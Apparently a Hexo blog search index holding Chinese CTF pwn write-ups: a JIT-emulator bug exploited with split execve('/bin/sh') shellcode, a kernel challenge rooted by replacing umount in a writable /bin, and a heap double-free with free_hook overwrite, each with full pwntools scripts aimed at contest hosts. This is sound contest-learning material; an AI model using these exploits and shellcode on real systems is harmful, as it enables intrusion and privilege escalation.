spellcheck="true">#gdb.attach(io, 'b *0x401416')</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b *0x40149d')</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>这题和南阳理工的师傅交流的过程中，发现他们因为找不到2.23对应的c++库，放弃了调试。如wp所示，我调试的过程中，是直接先用自己虚拟机的libc库怼成功了，然后直接改用给的2.23偏移打远程。这样暴力的方法有一个问题：就是不同libc库会导致environ栈地址和canary的偏移不同（stack_addr = leak_stack + 0x7fffaca833c8 - 0x7fffaca834d8这句），好在我远程的过程中试了几次就找到了2.23下的canary偏移，比较幸运</p><p>当然，时间充足的情况下，肯定是能找到所有对应库本地调试，最严谨。</p><h1 id="fast-emulator"><a href="#fast-emulator" class="headerlink" title="fast_emulator"></a>fast_emulator</h1><h3 id="题目复现-1"><a href="#题目复现-1" class="headerlink" title="题目复现"></a>题目复现</h3><p>程序实现了一个能实现load,add,sub,mul,div,xor指令的即时编译器，用户逐行输入指令， parse_line会把指令分析为args结构体，然后args结构体会被翻译为shellcode，全部输入后执行shellcode</p><p><img src="2.png" alt="main process"></p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>说说我解题时的过程（基本是废话）</p><p>我先把所有指令试了一遍，然后动调发现div指令实际的shellcode是loopne，我就考虑用loopne直接跳转到load的数据造成恶意执行。比如有一句’load r1, 0x12345678’，直接跳转到\x12\x34\x56\x78的地方</p><p>然后我想让跳转执行的命令更长，就试了一下’load r1,0x1111111111’,然后动调发现，shellcode实际被翻译为’mov rax, 0x11111111’再加上\x11\x11</p><p>也就是说，<strong>这个mov rax,(num)最多只能支持32位数，但解析的过程中可以拼接超过32位的数，超过的部分会变成下一行汇编执行</strong></p><p>再静态分析，正是这个from_hex函数没有限制16进制数的大小</p><p><img src="3.png" alt="from_hex"></p><p>这样我们相当于可以直接用这个漏洞任意执行了，但还要注意，我们输入的每行指令有长度限制，因此网上扒的shellcode得分段</p><p>具体大小端之类的麻烦问题直接看我wp</p><h3 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">lg</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[1;31;40m%20s-->0x%x\033[0m'</span><span class="token operator">%</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = process('./pwn')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'172.31.3.108'</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b*$rebase(0x1a16)')</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b*$rebase(0x16d5)')</span>payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>shellcode <span class="token operator">=</span> <span class="token string">'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token string">'load r2, 0x'</span> <span class="token operator">+</span> b<span class="token string">'f63148'</span> <span class="token operator">+</span> b<span class="token string">'0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token string">'load r2, 0x'</span> <span class="token operator">+</span> b<span class="token string">'68732f2f6e69622fbf4856'</span> <span class="token operator">+</span> b<span class="token string">'0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token string">'load r2, 0x'</span> <span class="token operator">+</span> b<span class="token string">'5f5457'</span> <span class="token operator">+</span> b<span class="token string">'0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token string">'load r2, 0x'</span> <span class="token operator">+</span> b<span class="token string">'050f99583b6a'</span> <span class="token operator">+</span> b<span class="token string">'0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>length <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'enter:'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>game非预期</title>
      <link href="/2022/12/16/game%E9%9D%9E%E9%A2%84%E6%9C%9F/"/>
      <url>/2022/12/16/game%E9%9D%9E%E9%A2%84%E6%9C%9F/</url>
      
        <content type="html"><![CDATA[<p>这次game盯了好久，结果大家都是非预期。特此来学习一下</p><p>我们的内核题大概是先在start.sh中启动qemu，然后启用文件系统里的init脚本</p><p><img src="1.png" alt="解压后的文件系统"></p><p><img src="2.png" alt="init脚本"></p><p>那么问题就在，如果我们原本的文件系统中bin文件夹没有设置root为所有者，而且init的脚本也没有设置相应的权限变动，<strong>最终题目呈现的结果就是做题者对bin文件夹拥有rwx权限，可以随便增删查改bin中的所有命令</strong></p><p>再看我们的init脚本</p><p>用1000的uid（即chal用户）执行完/bin/sh后，用root权限调用了umount,poweroff命令，如果我们把umount,poweroff任意一个换成/bin/sh，并结束当前的/bin/sh，就相当于root权限执行了/bin/sh实现了提权</p><p>不知道poweroff替换为啥失败了，还是用大家都用的替换umount试验一下</p><p><img src="3.png" alt="替换umount提权"></p><p>要避免这种非预期很简单，在init脚本中chown bin sbin这些文件夹给root，或者直接输命令chown它们就行了，不再赘述了</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCTF2022diary</title>
      <link href="/2022/12/13/RCTF2022diary/"/>
      <url>/2022/12/13/RCTF2022diary/</url>
      
        <content type="html"><![CDATA[<p>这次RCTF本来准备给校队认真打的，结果写了一题我们学校突然说放假了，我就兴奋的没怎么看了。</p><p>就看了diary和game，以为game是签到题，结果是非预期我不知道。看来linux部署这块得好好学学。</p><p>要是跟着r3打就好了，我就能把精力放在那几道堆题上了（bushi）</p><p>看了一下大战队们的wp，解法好像跟我的完全不一样（比我的简单多了），就来分享一下。</p><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>本质是个堆题，可以add,edit,delete，有意思的事还能encrypt,decrypt，其实我都没把题目逆完。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我代码也怎么仔细审，本来想fuzz的。后来自己随便试了试，在创建多个chunk后，如果我们删掉非最后一个的chunk就会导致一个double free的效果。</p><pre class=" language-python"><code class="language-python">sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'add#1#2#3#4#5#6#'</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'add#2#2#3#4#5#6#'</span> <span class="token operator">+</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'delete#0'</span><span class="token punctuation">)</span></code></pre><p><img src="1.png" alt="double free"></p><p>有这个double free我们就基本上随便打了吧，因为是0x311的堆块，libc和heap地址都有了</p><p>问题是由于每个堆块前4个字节都会被置为0x20，我们tcache attack就没那么方便了。</p><p>我瞄了眼nu1l的wp里提到了什么encrypt时候的calloc啥的，这块我都没看。我的想法是：<strong>有什么方法能让前4个字节，变成我们预期打的free_hook地址?</strong></p><p>试了下encrypt函数,可以对前四字节逐字节加密，这个加密是和一系列随机字节异或产生的。而且这个随机后的值我们也可以通过show拿到，<strong>那么我们只要逐字节不断爆破，获得预期字节，就能得到free_hook地址。</strong> 也不用把程序逆完了。</p><pre class=" language-python"><code class="language-python">i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> i<span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        encrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>        show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        ru<span class="token punctuation">(</span><span class="token string">'6\n'</span><span class="token punctuation">)</span>        r<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        cur <span class="token operator">=</span> u8<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            decrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>            i <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                encrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'another try'</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span>bruce_byte<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'succuss brute'</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#gdb.attach(io)</span>            i<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">break</span></code></pre><h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> random<span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>ru         <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span>a<span class="token punctuation">)</span>r         <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">:</span>        io<span class="token punctuation">.</span>read<span class="token punctuation">(</span>n<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>sa         <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>sl        <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>a<span class="token punctuation">)</span>s         <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">lg</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[1;31;40m%20s-->0x%x\033[0m'</span><span class="token operator">%</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = process('./pwn')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'119.13.105.35'</span><span class="token punctuation">,</span> <span class="token number">10111</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#elf = ELF('./pwn')</span><span class="token comment" spellcheck="true">#libc = ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sa<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span><span class="token string">'add#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'#2#3#4#5#6#'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sa<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span><span class="token string">'update#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'#'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'show#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'delete#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'encrypt#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'#1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'decrypt#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak heap</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'6\n'</span><span class="token punctuation">)</span>leak_heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_heap'</span><span class="token punctuation">,</span> leak_heap<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak libc</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">16</span><span class="token operator">+</span>i<span class="token punctuation">,</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dele<span class="token punctuation">(</span><span class="token number">10</span><span class="token operator">-</span>i<span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'6\n'</span><span class="token punctuation">)</span>leak_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_libc'</span><span class="token punctuation">,</span> leak_libc<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak_libc <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7f17465e4be0</span> <span class="token operator">-</span> <span class="token number">0x7f17463f8000</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_base'</span><span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span><span class="token comment" spellcheck="true"># tcache attack</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">+</span>i<span class="token punctuation">,</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>target <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7fc9ae630e48</span> <span class="token operator">-</span><span class="token number">0x7fc9ae442000</span><span class="token punctuation">)</span>  <span class="token operator">-</span><span class="token number">4</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>target <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x300</span><span class="token punctuation">)</span>bruce_byte <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>bruce_byte<span class="token punctuation">.</span>append<span class="token punctuation">(</span>target <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>bruce_byte<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>target <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>bruce_byte<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>target <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>bruce_byte<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>target <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>bruce_byte<span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'target'</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pause()</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b*$rebase(0x30d5)')</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> i<span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        encrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>        show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        ru<span class="token punctuation">(</span><span class="token string">'6\n'</span><span class="token punctuation">)</span>        r<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        cur <span class="token operator">=</span> u8<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            decrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>            i <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                encrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'another try'</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span>bruce_byte<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'succuss brute'</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#gdb.attach(io)</span>            i<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'succuss rute'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> b<span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">41</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>bdele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="比赛总结"><a href="#比赛总结" class="headerlink" title="比赛总结"></a>比赛总结</h3><p>其实这题我纯纯瞎猫碰死耗子写的，题目也没审完。好久没认真打ctf感觉自己专注度，体力啥的下降很大，学校一堆屁事牵扯了很多精力，原来跟着r3打也都是别人找完洞自己偷鸡写个脚本。从今天开始要痛定思痛，加强时间管理，不能摆下去了。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/04/14/hello-world/"/>
      <url>/2022/04/14/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
